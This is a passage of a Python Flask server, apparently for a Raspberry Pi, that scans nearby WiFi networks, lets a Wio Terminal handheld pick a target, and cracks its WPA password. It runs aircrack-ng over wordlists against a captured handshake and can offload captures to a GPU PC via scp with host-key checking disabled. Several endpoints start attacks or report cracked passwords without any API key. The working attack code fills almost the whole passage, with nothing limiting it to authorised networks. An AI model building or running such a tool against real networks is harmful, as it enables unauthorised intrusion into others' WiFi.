                raise Exception("No wordlists found")
            
            # Try each wordlist on Pi
            max_wordlists = min(3, len(wordlists))
            for i, wordlist_info in enumerate(wordlists[:max_wordlists]):
                wordlist_path = wordlist_info["path"]
                wordlist_name = os.path.basename(wordlist_path)
                logger.info(f"Trying wordlist {i+1}/{max_wordlists}: {wordlist_path}")
                
                base_progress = 75 + (i * 8)  # 75, 83, 91
                step_update(f"Pi attacking with {wordlist_name}", base_progress, "cracking", 0,
                           {"current_wordlist": wordlist_name})
                
                # Handle compressed wordlists
                if wordlist_path.endswith('.gz'):
                    cmd = f"gunzip -c {wordlist_path} | aircrack-ng -w - -q {cap_pcap_file}"
                else:
                    cmd = f"aircrack-ng -w {wordlist_path} -q {cap_pcap_file}"
                
                if target_bssid:
                    cmd += f" -b {target_bssid}"
                
                # Update progress during attack
                step_update(f"Running Pi {wordlist_name}", base_progress + 3, "cracking", 50,
                           {"current_wordlist": wordlist_name})
                
                rc, out, err = run_cmd(cmd, timeout=min(ATTACK_TIMEOUT_SEC // max_wordlists, 180))
                
                step_update(f"Processing Pi results", base_progress + 6, "cracking", 90,
                           {"current_wordlist": wordlist_name})
                
                # Check for successful crack
                import re
                key_match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", out)
                if key_match:
                    pwd = key_match.group(1).strip()
                    logger.info(f"Password found: {pwd}")
                    step_update(f"Pi cracked: {pwd}", 95, "complete", 100,
                               {"current_wordlist": wordlist_name})
                    break
                
                logger.info(f"No match in {wordlist_name}")
                step_update(f"No match in {wordlist_name}", base_progress + 7, "cracking", 100,
                           {"current_wordlist": ""})
        
        if pwd == "NOT FOUND":
            logger.warning(f"Password not found in available wordlists")

        step_update("Finalizing results", 98, "complete")

        with state_lock:
            attack_state["result"] = pwd
            attack_state["step"] = "Attack completed" if pwd != "NOT FOUND" else "Attack completed - password not found"
            attack_state["progress"] = 100
            attack_state["running"] = False
            attack_state["phase"] = "complete"
            attack_state["last_update"] = time.time()

    except Exception as e:
        logger.error(f"Attack failed: {e}")
        with state_lock:
            attack_state["step"] = f"error: {str(e)}"
            attack_state["running"] = False
            attack_state["progress"] = 0
            attack_state["result"] = "FAILED"
    finally:
        # ensure procs killed and cleanup
        with state_lock:
            kill_process_tree(attack_state["proc_pids"])
            attack_state["proc_pids"].clear()
        
        # Reset monitor interface to managed mode
        mon_iface = interface_state.get("mon_iface", MON_IFACE)
        if mon_iface in interface_state.get("available_interfaces", []):
            setup_managed_mode(mon_iface)

def step_update(step, prog, phase=None, sub_progress=0, extra_info=None):
    """Update attack progress with detailed tracking"""
    with state_lock:
        attack_state["step"] = step
        attack_state["progress"] = prog
        attack_state["last_update"] = time.time()
        attack_state["sub_progress"] = sub_progress
        
        if phase:
            attack_state["phase"] = phase
            
        if extra_info:
            for key, value in extra_info.items():
                if key in attack_state:
                    attack_state[key] = value
    
    logger.info(f"Attack progress: {step} ({prog}%) - Phase: {phase or attack_state.get('phase', 'unknown')}")

def register_pid(pid):
    """Register process PID for cleanup"""
    with state_lock:
        attack_state["proc_pids"].append(pid)
    logger.debug(f"Registered PID {pid}")

def sanitize(name):
    """Sanitize filename to prevent path injection"""
    # Remove/replace dangerous characters
    sanitized = re.sub(r"[^A-Za-z0-9_.-]", "_", name)
    # Prevent directory traversal
    sanitized = sanitized.replace("..", "_")
    # Limit length
    return sanitized[:50]

def transfer_cap_to_gpu_pc(cap_file_path):
    """Transfer capture file to GPU PC for processing"""
    if not ENABLE_GPU_OFFLOAD or not GPU_PC_IP:
        logger.info("GPU offload disabled or not configured")
        return False
    
    try:
        logger.info(f"Transferring {cap_file_path} to GPU PC {GPU_PC_IP}")
        
        # Use SCP with SSH key
        scp_cmd = [
            "scp", "-i", SSH_KEY_PATH,
            "-o", "StrictHostKeyChecking=no",
            "-o", "ConnectTimeout=10",
            str(cap_file_path),
            f"{GPU_PC_USER}@{GPU_PC_IP}:{GPU_PC_INCOMING_DIR}/"
        ]
        
        result = subprocess.run(scp_cmd, capture_output=True, text=True, timeout=30)
        
        if result.returncode == 0:
            logger.info("Successfully transferred capture file to GPU PC")
            return True
        else:
            logger.error(f"SCP transfer failed: {result.stderr}")
            return False
            
    except Exception as e:
        logger.error(f"Error transferring to GPU PC: {e}")
        return False

def transfer_cap_to_gpu_pc_http(cap_file_path):
    """Transfer capture file to GPU PC via HTTP/manual copy"""
    if not ENABLE_GPU_OFFLOAD or not GPU_PC_IP:
        logger.info("GPU offload disabled or not configured")
        return False
    
    try:
        logger.info(f"Preparing {cap_file_path} for GPU PC transfer")
        
        # Copy file to a temporary location accessible via web
        web_path = CAP_DIR / "for_gpu" / cap_file_path.name
        web_path.parent.mkdir(exist_ok=True)
        
        import shutil
        shutil.copy2(cap_file_path, web_path)
        
        logger.info(f"File ready for manual transfer at: {web_path}")
        logger.info(f"Manual step: Copy {web_path} to {GPU_PC_IP}:{GPU_PC_INCOMING_DIR}")
        
        # For now, just prepare the file - manual transfer needed
        return True
        
    except Exception as e:
        logger.error(f"Error preparing file for GPU PC: {e}")
        return False

def wait_for_gpu_result(target_ssid, timeout=300):
    """Wait for GPU PC to return cracking result"""
    start_time = time.time()
    
    while time.time() - start_time < timeout:
        # Check if we have a result
        with state_lock:
            if attack_state.get("gpu_result"):
                result = attack_state["gpu_result"]
                attack_state["gpu_result"] = None  # Clear it
                return result
        
        time.sleep(2)  # Poll every 2 seconds
    
    logger.warning("GPU cracking timeout")
    return "NOT FOUND"

# --------------- FLASK APP --------------
app = Flask(__name__)
CORS(app)

# Initialize interfaces on startup
initialize_interfaces()

@app.route("/scan", methods=["GET"])
@require_api_key
def scan():
    try:
        scan_iface = interface_state.get("scan_iface", SCAN_IFACE)
        logger.info(f"Starting scan on interface {scan_iface}")
        
        # Check if interface exists
        if scan_iface not in interface_state.get("available_interfaces", []):
            logger.error(f"Scan interface {scan_iface} not available")
            return jsonify({"error": f"Interface {scan_iface} not found"}), 404
        
        # Verify interface is actually available
        rc_check, _, _ = run_cmd(f"ip link show {scan_iface}", timeout=5)
        if rc_check != 0:
            logger.error(f"Interface {scan_iface} does not exist")
            return jsonify({"error": f"Interface {scan_iface} does not exist"}), 404
        
        # Ensure interface is in managed mode for scanning
        logger.info(f"Setting {scan_iface} to managed mode")
        if not setup_managed_mode(scan_iface):
            logger.error(f"Failed to set {scan_iface} to managed mode")
            return jsonify({"error": f"Failed to configure interface {scan_iface}"}), 500
        
        # Wait for interface to be ready
        time.sleep(2)
        
        # Check interface is up
        rc_up, out_up, _ = run_cmd(f"ip link show {scan_iface}", timeout=5)
        if rc_up == 0 and "UP" not in out_up:
            logger.warning(f"Interface {scan_iface} is not UP, attempting to bring up")
            rc_setup, _, err_setup = run_cmd(f"sudo ip link set {scan_iface} up", timeout=10)
            if rc_setup != 0:
                logger.error(f"Failed to bring up interface: {err_setup}")
                return jsonify({"error": f"Failed to bring up interface {scan_iface}"}), 500
            time.sleep(1)
        
        # Attempt scan with retries
        max_retries = 3
        for attempt in range(max_retries):
            logger.info(f"Scan attempt {attempt + 1}/{max_retries} on {scan_iface}")
            
            rc, out, err = run_cmd(f"sudo iw dev {scan_iface} scan", timeout=30)
            
            if rc == 0 and out:
                break
            elif "Device or resource busy" in err:
                logger.warning(f"Interface busy on attempt {attempt + 1}, retrying...")
                time.sleep(2)
                continue
            elif "No such device" in err:
                logger.error(f"Interface {scan_iface} disappeared")
                return jsonify({"error": f"Interface {scan_iface} not found"}), 404
            else:
                logger.warning(f"Scan attempt {attempt + 1} failed: {err}")
                if attempt == max_retries - 1:
                    logger.error(f"All scan attempts failed: {err}")
                    return jsonify({"error": "scan failed after retries", "details": err}), 500
                time.sleep(2)
        
        if not out:
            logger.warning("Scan returned no output")
            return jsonify({"networks": [], "count": 0}), 200
        
        nets = parse_iw_scan(out)
        logger.info(f"Found {len(nets)} networks")
        
        # Log target network if found
        target_found = any(net.get("ssid") == "FBISurveillanceVan" for net in nets)
        if target_found:
            logger.info("Target network 'FBISurveillanceVan' found in scan results")
        
        return jsonify({"networks": nets, "count": len(nets)}), 200
        
    except Exception as e:
        logger.error(f"Scan error: {e}")
        return jsonify({"error": "Internal server error", "details": str(e)}), 500

@app.route("/start", methods=["POST"])
@require_api_key
def start():
    try:
        data = request.get_json(silent=True) or {}
        ssid = data.get("ssid", "").strip()
        
        if not ssid:
            return jsonify({"error": "ssid required"}), 400
        
        # Validate SSID
        valid, msg = validate_ssid(ssid)
        if not valid:
            logger.warning(f"Invalid SSID rejected: {ssid}")
            return jsonify({"error": msg}), 400
        
        with state_lock:
            if attack_state["running"]:
                return jsonify({"error": "attack already running"}), 409
        
        logger.info(f"Starting attack on SSID: {ssid}")
        t = threading.Thread(target=attack_worker, args=(ssid,), daemon=True)
        t.start()
        return jsonify({"message": "attack started", "target": ssid}), 200
        
    except Exception as e:
        logger.error(f"Start attack error: {e}")
        return jsonify({"error": "Internal server error"}), 500

@app.route("/status", methods=["GET"])
@require_api_key
def status():
    try:
        with state_lock:
            st = attack_state.copy()
        
        current_time = time.time()
        runtime = int(current_time - st["start_ts"]) if st["start_ts"] > 0 else 0
        
        # Calculate time since last update for staleness detection
        time_since_update = int(current_time - st.get("last_update", current_time))
        
        response = {
            "running": st["running"],
            "step": st["step"],
            "progress": st["progress"],
            "sub_progress": st.get("sub_progress", 0),
            "phase": st.get("phase", "idle"),
            "target": st.get("target", ""),
            "target_bssid": st.get("target_bssid", ""),
            "runtime": runtime,
            "time_since_update": time_since_update,
            "estimated_time_remaining": st.get("estimated_time_remaining", 0),
            "current_wordlist": st.get("current_wordlist", ""),
            "handshake_captured": st.get("handshake_captured", False),
            "networks_found": st.get("networks_found", 0),
            "gpu_processing": st.get("gpu_processing", False),
            "gpu_enabled": ENABLE_GPU_OFFLOAD,
            "timestamp": int(current_time),
            "is_stale": time_since_update > 10  # Consider stale if no update in 10 seconds
        }
        
        # Add completion flag for easier detection
        if not st["running"] and st["progress"] == 100:
            response["completed"] = True
            response["final_result"] = st.get("result", "")
        elif not st["running"] and "error" in st.get("step", "").lower():
            response["failed"] = True
            response["error_message"] = st.get("step", "")
        else:
            response["completed"] = False
            response["failed"] = False
        
        return jsonify(response), 200
        
    except Exception as e:
        logger.error(f"Status error: {e}")
        return jsonify({"error": "Internal server error"}), 500

# Lightweight status endpoint for embedded devices like Wio Terminal
@app.route("/simple", methods=["GET"])
@require_api_key  
def simple_status():
    try:
        with state_lock:
            st = attack_state.copy()
        
        # Ultra-minimal response for embedded devices
        response = {
            "r": 1 if st["running"] else 0,  # running (1/0 instead of true/false)
            "p": st["progress"],              # progress (0-100)
            "s": st.get("phase", "idle")[:8], # status/phase (truncated)
            "t": st.get("target", "")[:16]    # target (truncated)
        }
        
        # Add result when done
        if not st["running"]:
            result = st.get("result", "")
            if result and result != "NOT FOUND":
                response["pw"] = result[:32]  # password (truncated)
            else:
                response["pw"] = ""
                
        return jsonify(response), 200
        
    except Exception as e:
        logger.error(f"Simple status error: {e}")
        return jsonify({"error": "error"}), 500

# Plain text status endpoint - easiest for Wio Terminal to parse
@app.route("/text", methods=["GET"])
def text_status():
    # Check API key manually without rate limiting for polling
    api_key = request.headers.get('X-API-Key')
    if not api_key or api_key != API_KEY:
        return "0|0|error||", 401, {'Content-Type': 'text/plain'}
    try:
        with state_lock:
            st = attack_state.copy()
        
        if not st["running"] and st["progress"] == 0:
            return "0|0|idle||", 200, {'Content-Type': 'text/plain'}
        
        # Plain text format: RUNNING|PROGRESS|PHASE|TARGET|RESULT
        running = "1" if st["running"] else "0"
        progress = str(st["progress"])
        phase = st.get("phase", "idle")[:10]
        target = st.get("target", "")[:16]  # Match your 16 char limit
        
        # Result handling - only when attack is complete
        result = ""
        if not st["running"] and st["progress"] == 100:
            result = st.get("result", "")[:20]
        
        # Format: R|P|S|T|PW (pipe-separated for easy parsing)
        response_text = f"{running}|{progress}|{phase}|{target}|{result}"
        
        return response_text, 200, {'Content-Type': 'text/plain'}
        
    except Exception as e:
        logger.error(f"Text status error: {e}")
        return "0|0|error||", 500, {'Content-Type': 'text/plain'}

# Ultra-simple ping endpoint for connection testing
@app.route("/ping", methods=["GET"])
def ping():
    return "pong", 200, {'Content-Type': 'text/plain'}

# Command-based API for Wio Terminal remote control
# Pi does all processing, Wio just sends commands and displays results

@app.route("/cmd/<command>", methods=["GET", "POST"])
def handle_command(command):
    """Handle remote commands from Wio Terminal"""
    try:
        if command == "menu":
            # Return formatted menu for display
            return format_main_menu(), 200, {'Content-Type': 'text/plain'}
            
        elif command == "networks":
            # Return formatted network list
            return format_network_list(), 200, {'Content-Type': 'text/plain'}
            
        elif command == "attack":
            # Start attack on target from POST data
            if request.method == "POST":
                data = request.get_json(silent=True) or {}
                target = data.get("target", "")
                if target:
                    return start_attack_command(target), 200, {'Content-Type': 'text/plain'}
            return "ERROR: No target specified", 400, {'Content-Type': 'text/plain'}
            
        elif command == "status":
            # Return formatted attack status
            return format_attack_status(), 200, {'Content-Type': 'text/plain'}
            
        elif command == "cancel":
            # Cancel current attack
            return cancel_attack_command(), 200, {'Content-Type': 'text/plain'}
            
        else:
            return f"ERROR: Unknown command: {command}", 400, {'Content-Type': 'text/plain'}
            
    except Exception as e:
        logger.error(f"Command error: {e}")
        return "ERROR: Server error", 500, {'Content-Type': 'text/plain'}

def format_main_menu():
    """Format main menu for Wio Terminal display"""
    menu = "=== WiFi PENTEST ===\\n"
    menu += "1. SCAN NETWORKS\\n"
    menu += "2. VIEW RESULTS\\n"
    menu += "3. SYSTEM INFO\\n"
    menu += "UP/DOWN: Navigate\\n"
    menu += "CENTER: Select"
    return menu

def format_network_list():
    """Scan networks and return formatted list"""
    try:
        scan_iface = interface_state.get("scan_iface", SCAN_IFACE)
        setup_managed_mode(scan_iface)
        time.sleep(1)
        
        rc, out, err = run_cmd(f"sudo iw dev {scan_iface} scan", timeout=15)
        if rc != 0:
            return "ERROR: Scan failed"
        
        nets = parse_iw_scan(out)
        if not nets:
            return "No networks found"
        
        # Format for display (Pi does all processing)
        result = f"=== NETWORKS ({len(nets)}) ===\\n"
        for i, net in enumerate(nets[:10]):  # Limit to 10
            ssid = net.get('ssid', 'Hidden')[:15]  # Truncate
            signal = net.get('signal', -100)
            encryption = 'WPA' if 'WPA' in net.get('encryption', '') else 'Open'
            result += f"{i+1:2d}. {ssid:<15} {signal:>4}dBm {encryption}\\n"
        
        result += "UP/DOWN: Select\\nCENTER: Attack"
        return result
        
    except Exception as e:
        logger.error(f"Network scan error: {e}")
        return "ERROR: Scan failed"

def start_attack_command(target_ssid):
    """Start attack and return immediate response"""
    try:
        with state_lock:
            if attack_state["running"]:
                return "ERROR: Attack already running"
        
        # Start attack in background thread
        t = threading.Thread(target=attack_worker, args=(target_ssid,), daemon=True)
        t.start()
        
        return f"ATTACK STARTED\\nTarget: {target_ssid}\\nCheck status for updates"
        
    except Exception as e:
        logger.error(f"Attack start error: {e}")
        return "ERROR: Failed to start attack"

def format_attack_status():
    """Format attack status for display"""
    try:
        with state_lock:
            st = attack_state.copy()
        
        if not st["running"] and st["progress"] == 0:
            return "STATUS: IDLE\\nNo attack running\\n\\nPress MENU to start"
        
        # Format status display
        status = f"=== ATTACK STATUS ===\\n"
        status += f"Target: {st.get('target', 'Unknown')[:16]}\\n"
        status += f"Phase: {st.get('phase', 'unknown').upper()}\\n"
        status += f"Progress: {st['progress']}%\\n"
        
        # Show progress bar
        progress_bar = "["
        filled = st['progress'] // 5  # 20 char bar
        progress_bar += "=" * filled + "-" * (20 - filled) + "]"
        status += progress_bar + "\\n"
        
        if not st["running"]:
            result = st.get("result", "")
            if result and result != "NOT FOUND":
                status += f"\\nSUCCESS!\\nPassword: {result[:20]}"
            else:
                status += "\\nFAILED\\nPassword not found"
        else:
            runtime = int(time.time() - st["start_ts"]) if st["start_ts"] > 0 else 0
            status += f"\\nRuntime: {runtime}s"
        
        return status
        
    except Exception as e:
        logger.error(f"Status format error: {e}")
        return "ERROR: Status unavailable"

def cancel_attack_command():
    """Cancel running attack"""
    try:
        with state_lock:
            if not attack_state["running"]:
                return "No attack to cancel"
            
            kill_process_tree(attack_state["proc_pids"])
            attack_state["running"] = False
            attack_state["step"] = "cancelled"
            attack_state["progress"] = 0
            attack_state["result"] = "CANCELLED"
        
        return "ATTACK CANCELLED\\nReturning to menu..."
        
    except Exception as e:
        logger.error(f"Cancel error: {e}")
        return "ERROR: Cancel failed"

# ==== ULTRA-SIMPLE REMOTE CONTROL API ====
# Pi does ALL processing, Wio just sends simple commands

def scan_and_cache_networks():
    """Scan networks and cache results for pagination"""
    global networks_cache
    
    try:
        with networks_cache["scan_lock"]:
            scan_iface = interface_state.get("scan_iface", SCAN_IFACE)
            setup_managed_mode(scan_iface)
            time.sleep(1)
            
            logger.info("Scanning networks for cache...")
            rc, out, err = run_cmd(f"sudo iw dev {scan_iface} scan", timeout=20)
            if rc != 0:
                logger.error(f"Network scan failed: {err}")
                return False
            
            nets = parse_iw_scan(out)
            
            # Store in cache with full details
            networks_cache["networks"] = []
            for i, net in enumerate(nets[:20]):  # Limit to 20 networks
                network_info = {
                    "number": i + 1,
                    "ssid": net.get('ssid', 'Hidden')[:12],  # Limit to 12 chars MAX
                    "signal": net.get('signal', -100),
                    "encryption": 'WPA' if 'WPA' in net.get('encryption', '') else 'Open',
                    "bssid": net.get('bssid', '')
                }
                networks_cache["networks"].append(network_info)
            
            networks_cache["last_scan"] = time.time()
            logger.info(f"Cached {len(networks_cache['networks'])} networks")
            return True
            
    except Exception as e:
        logger.error(f"Network cache error: {e}")
        return False

@app.route("/networks", methods=["GET"])
def get_networks():
    """Simple network list - Pi does all scanning (legacy endpoint)"""
    try:
        if not scan_and_cache_networks():
            return "ERROR: Scan failed", 500, {'Content-Type': 'text/plain'}
        
        if not networks_cache["networks"]:
            return "No networks found", 200, {'Content-Type': 'text/plain'}
        
        # Return ultra-minimal format: SSID|SIGNAL|ENCRYPTION (12 char SSID max)
        result = []
        for net in networks_cache["networks"]:
            result.append(f"{net['ssid']}|{net['signal']}|{net['encryption']}")
        
        return '\n'.join(result), 200, {'Content-Type': 'text/plain'}
        
    except Exception as e:
        logger.error(f"Networks error: {e}")
        return "ERROR: Scan failed", 500, {'Content-Type': 'text/plain'}

@app.route("/networks/count", methods=["GET"])
def get_network_count():
    """Get total number of networks found"""
    try:
        # Use cached data if recent (within 2 minutes), otherwise rescan
        if time.time() - networks_cache["last_scan"] > 120:
            if not scan_and_cache_networks():
                return '{"count": 0, "error": "Scan failed"}', 500, {'Content-Type': 'application/json'}
        
        count = len(networks_cache["networks"])
        return f'{{"count": {count}}}', 200, {'Content-Type': 'application/json'}
        
    except Exception as e:
        logger.error(f"Network count error: {e}")
        return '{"count": 0, "error": "Server error"}', 500, {'Content-Type': 'application/json'}

@app.route("/networks/page/<int:page>", methods=["GET"])
def get_network_page(page):
    """Get specific page of networks (3 networks per page)"""
    try:
        NETWORKS_PER_PAGE = 3
        
        # Use cached data if recent, otherwise rescan
        if time.time() - networks_cache["last_scan"] > 120:
            if not scan_and_cache_networks():
                return "ERROR: Scan failed", 500, {'Content-Type': 'text/plain'}
        
        total_networks = len(networks_cache["networks"])
        total_pages = (total_networks + NETWORKS_PER_PAGE - 1) // NETWORKS_PER_PAGE
        
        if page < 1 or page > total_pages:
            return f"ERROR: Page {page} not found (1-{total_pages})", 400, {'Content-Type': 'text/plain'}
        
        # Calculate page boundaries
        start_idx = (page - 1) * NETWORKS_PER_PAGE
        end_idx = min(start_idx + NETWORKS_PER_PAGE, total_networks)
        
        # Format page display - ultra-minimal: number|ssid|signal|encryption
        result = []
        for i in range(start_idx, end_idx):
            net = networks_cache["networks"][i]
            result.append(f"{net['number']}|{net['ssid']}|{net['signal']}|{net['encryption']}")
        
        # Return with actual newlines (not literal \\n)
        return '\n'.join(result), 200, {'Content-Type': 'text/plain'}
        
    except Exception as e:
        logger.error(f"Network page error: {e}")
        return "ERROR: Page failed", 500, {'Content-Type': 'text/plain'}

@app.route("/attack_target/<int:network_number>", methods=["POST"])
def attack_target_number(network_number):
    """Start attack on network by number from cached list"""
    try:
        # Check if we have cached networks
        if not networks_cache["networks"]:
            return "ERROR: No networks cached. Scan first.", 400, {'Content-Type': 'text/plain'}
        
        # Find network by number
        target_network = None
        for net in networks_cache["networks"]:
            if net["number"] == network_number:
                target_network = net
                break
        
        if not target_network:
            total = len(networks_cache["networks"])
            return f"ERROR: Network {network_number} not found (1-{total})", 400, {'Content-Type': 'text/plain'}
        
        # Check if attack already running
        with state_lock:
            if attack_state["running"]:
                return "ERROR: Attack already running", 409, {'Content-Type': 'text/plain'}
        
        # Start attack
        ssid = target_network["ssid"]
        t = threading.Thread(target=attack_worker, args=(ssid,), daemon=True)
        t.start()
        
        logger.info(f"Started attack on network {network_number}: {ssid}")
        return f"STARTED|{ssid}", 200, {'Content-Type': 'text/plain'}
        
    except Exception as e:
        logger.error(f"Attack target error: {e}")
        return "ERROR: Failed to start", 500, {'Content-Type': 'text/plain'}

@app.route("/status_simple", methods=["GET"])
def get_status_simple():
    """Ultra-simple status: running|progress|phase|target"""
    try:
        with state_lock:
            st = attack_state.copy()
        
        running = "1" if st["running"] else "0"
        progress = str(st["progress"])
        phase = st.get("phase", "idle")
        target = st.get("target", "")
        
        return f"{running}|{progress}|{phase}|{target}", 200, {'Content-Type': 'text/plain'}
        
    except Exception as e:
        logger.error(f"Status simple error: {e}")
        return "0|0|error|", 500, {'Content-Type': 'text/plain'}

@app.route("/attack_start", methods=["POST"])
def attack_start():
    """Start attack on specified SSID"""
    try:
        data = request.get_json(silent=True) or {}
        ssid = data.get("ssid", "").strip()
        
        if not ssid:
            return "ERROR: No SSID provided", 400, {'Content-Type': 'text/plain'}
        
        with state_lock:
            if attack_state["running"]:
                return "ERROR: Attack already running", 409, {'Content-Type': 'text/plain'}
        
        # Start attack in background
        t = threading.Thread(target=attack_worker, args=(ssid,), daemon=True)
        t.start()
        
        return f"STARTED|{ssid}", 200, {'Content-Type': 'text/plain'}
        
    except Exception as e:
        logger.error(f"Attack start error: {e}")
        return "ERROR: Failed to start", 500, {'Content-Type': 'text/plain'}

@app.route("/attack_stop", methods=["POST"])
def attack_stop():
    """Stop current attack"""
    try:
        with state_lock:
            if not attack_state["running"]:
                return "NOT_RUNNING", 200, {'Content-Type': 'text/plain'}
            
            kill_process_tree(attack_state["proc_pids"])
            attack_state["running"] = False
            attack_state["step"] = "cancelled"
            attack_state["progress"] = 0
            attack_state["result"] = "CANCELLED"
        
        return "STOPPED", 200, {'Content-Type': 'text/plain'}
        
    except Exception as e:
        logger.error(f"Attack stop error: {e}")
        return "ERROR: Stop failed", 500, {'Content-Type': 'text/plain'}

@app.route("/results_simple", methods=["GET"])
def get_results_simple():
    """Get final results: SUCCESS|password or FAILED|reason"""
    try:
        with state_lock:
            st = attack_state.copy()
        
        if st["running"]:
            return "RUNNING|Attack in progress", 200, {'Content-Type': 'text/plain'}
        
        result = st.get("result", "")
        if result and result not in ["NOT FOUND", "FAILED", "CANCELLED"]:
            return f"SUCCESS|{result}", 200, {'Content-Type': 'text/plain'}
        else:
            return f"FAILED|{result}", 200, {'Content-Type': 'text/plain'}
        
    except Exception as e:
        logger.error(f"Results error: {e}")
        return "ERROR|Server error", 500, {'Content-Type': 'text/plain'}

@app.route("/results", methods=["GET"])
@require_api_key
def results():
    try:
        with state_lock:
            if attack_state["running"]:
                return jsonify({"error": "Attack still running"}), 409
            
            response = {
                "result": attack_state["result"],
                "target": attack_state.get("target", ""),
                "final_step": attack_state.get("step", ""),
                "total_runtime": int(time.time() - attack_state["start_ts"]) if attack_state["start_ts"] > 0 else 0
            }
            return jsonify(response), 200
            
    except Exception as e:
        logger.error(f"Results error: {e}")
        return jsonify({"error": "Internal server error"}), 500

@app.route("/files", methods=["GET"])
@require_api_key
def files():
    try:
        files = []
        if CAP_DIR.exists():
            for p in sorted(CAP_DIR.glob("*"), key=lambda x: x.stat().st_mtime, reverse=True):
                files.append({
                    "name": p.name,
                    "size": p.stat().st_size,
                    "mtime": int(p.stat().st_mtime),
                    "created": datetime.fromtimestamp(p.stat().st_mtime).isoformat()
                })
        
        return jsonify({"files": files, "total": len(files)}), 200
        
    except Exception as e:
        logger.error(f"Files listing error: {e}")
        return jsonify({"error": "Internal server error"}), 500

@app.route("/cancel", methods=["POST"])
@require_api_key
def cancel():
    try:
        with state_lock:
            if not attack_state["running"]:
                return jsonify({"message": "No attack running"}), 200
            
            logger.info("Cancelling attack")
            kill_process_tree(attack_state["proc_pids"])
            attack_state["running"] = False
            attack_state["step"] = "cancelled"
            attack_state["progress"] = 0
            attack_state["result"] = "CANCELLED"
        
        return jsonify({"message": "Attack cancelled"}), 200
        
    except Exception as e:
        logger.error(f"Cancel error: {e}")
        return jsonify({"error": "Internal server error"}), 500

@app.route("/wordlists", methods=["GET"])
@require_api_key
def get_wordlists():
    """Get available wordlists"""
    try:
        wordlists = interface_state.get("wordlists", [])
        return jsonify({
            "wordlists": [{
                "path": wl["path"],
                "name": os.path.basename(wl["path"]),
                "size_bytes": wl["size"],
                "size_mb": round(wl["size"] / 1024 / 1024, 2)
            } for wl in wordlists],
            "count": len(wordlists)
        }), 200
    except Exception as e:
        logger.error(f"Wordlists error: {e}")
        return jsonify({"error": "Internal server error"}), 500

# Add new endpoints
@app.route("/health", methods=["GET"])
def health():
    """Health check endpoint"""
    try:
        status_info = {
            "status": "healthy",
            "timestamp": datetime.now().isoformat(),
            "interfaces": {
                "scan": interface_state.get("scan_iface"),
                "monitor": interface_state.get("mon_iface"),
                "available": interface_state.get("available_interfaces", []),
                "monitor_tested": interface_state.get("monitor_tested", False),
                "last_monitor_test": interface_state.get("last_monitor_test", 0)
            },
            "tools_available": interface_state.get("tools_checked", False),
            "wordlists_available": len(interface_state.get("wordlists", [])),
            "capture_dir": str(CAP_DIR),
            "attack_running": attack_state.get("running", False),
            "gpu_offload": {
                "enabled": ENABLE_GPU_OFFLOAD,
                "pc_ip": GPU_PC_IP,
                "configured": bool(GPU_PC_IP and ENABLE_GPU_OFFLOAD)
            }
        }
        return jsonify(status_info), 200
    except Exception as e:
        logger.error(f"Health check error: {e}")
        return jsonify({"status": "unhealthy", "error": str(e)}), 500

@app.route("/config", methods=["GET"])
@require_api_key
def get_config():
    """Get current configuration"""
    try:
        config = {
            "attack_timeout": ATTACK_TIMEOUT_SEC,
            "capture_dir": str(CAP_DIR),
            "rate_limit": RATE_LIMIT_PER_MINUTE,
            "wordlist_dir": WORDLIST_DIR,
            "gpu_offload_enabled": ENABLE_GPU_OFFLOAD,
            "gpu_pc_ip": GPU_PC_IP,
            "interfaces": {
                "scan": interface_state.get("scan_iface"),
                "monitor": interface_state.get("mon_iface"),
                "available": interface_state.get("available_interfaces", [])
            },
            "wordlists": interface_state.get("wordlists", []),
            "tools_checked": interface_state.get("tools_checked", False)
        }
        return jsonify(config), 200
    except Exception as e:
        logger.error(f"Config error: {e}")
        return jsonify({"error": "Internal server error"}), 500

@app.route("/crack_result", methods=["POST"])
@require_api_key
def receive_gpu_result():
    """Receive cracking result from GPU PC"""
    try:
        data = request.get_json()
        target = data.get("target", "")
        password = data.get("password", "")
        cracked_by = data.get("cracked_by", "unknown")
        
        logger.info(f"Received GPU result for {target}: {password} (from {cracked_by})")
        
        # Store result for attack worker to pick up
        with state_lock:
            attack_state["gpu_result"] = password
            attack_state["gpu_processing"] = False
        
        return jsonify({"status": "received", "target": target}), 200
        
    except Exception as e:
        logger.error(f"GPU result error: {e}")
        return jsonify({"error": "Internal server error"}), 500

@app.route("/upload_cap", methods=["POST"])
@require_api_key
def upload_cap_file():
    """Upload .cap file from external source (like manual upload for GPU processing)"""
    try:
        if 'file' not in request.files:
            return jsonify({"error": "No file provided"}), 400
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({"error": "No file selected"}), 400
        
        if not file.filename.lower().endswith(('.cap', '.pcap')):
            return jsonify({"error": "Invalid file type. Must be .cap or .pcap"}), 400
        
        # Save uploaded file
        filename = sanitize(file.filename)
        upload_path = CAP_DIR / filename
        file.save(str(upload_path))
        
        logger.info(f"Uploaded capture file: {filename}")
        
        # If GPU processing is enabled, transfer to PC
        if ENABLE_GPU_OFFLOAD and GPU_PC_IP:
            if transfer_cap_to_gpu_pc_http(upload_path):
                return jsonify({
                    "status": "uploaded", 
                    "filename": filename,
                    "gpu_processing": True,
                    "message": "File uploaded and sent to GPU PC for processing"
                }), 200
            else:
                return jsonify({
                    "status": "uploaded", 
                    "filename": filename,
                    "gpu_processing": False,
                    "message": "File uploaded but GPU transfer failed"
                }), 200
        else:
            return jsonify({
                "status": "uploaded", 
                "filename": filename,
                "gpu_processing": False,
                "message": "File uploaded successfully"
            }), 200
        
    except Exception as e:
        logger.error(f"Upload error: {e}")
        return jsonify({"error": "Internal server error"}), 500

@app.route("/transfer_to_gpu", methods=["POST"])
@require_api_key
def manual_transfer_to_gpu():
    """Manually trigger transfer of latest capture file to GPU PC"""
    try:
        data = request.get_json() or {}
        filename = data.get("filename", "")
        
        if not filename:
            # Find latest capture file
            cap_files = list(CAP_DIR.glob("*.cap")) + list(CAP_DIR.glob("*.pcap"))
            if not cap_files:
                return jsonify({"error": "No capture files found"}), 404
            
            latest_file = max(cap_files, key=lambda x: x.stat().st_mtime)
        else:
            latest_file = CAP_DIR / filename
            if not latest_file.exists():
                return jsonify({"error": f"File {filename} not found"}), 404
        
        # Prepare for GPU transfer
        if transfer_cap_to_gpu_pc_http(latest_file):
            return jsonify({
                "status": "ready_for_transfer",
                "filename": latest_file.name,
                "source_path": str(latest_file),
                "target_path": f"{GPU_PC_IP}:{GPU_PC_INCOMING_DIR}",
                "message": "File ready for manual copy to GPU PC"
            }), 200
        else:
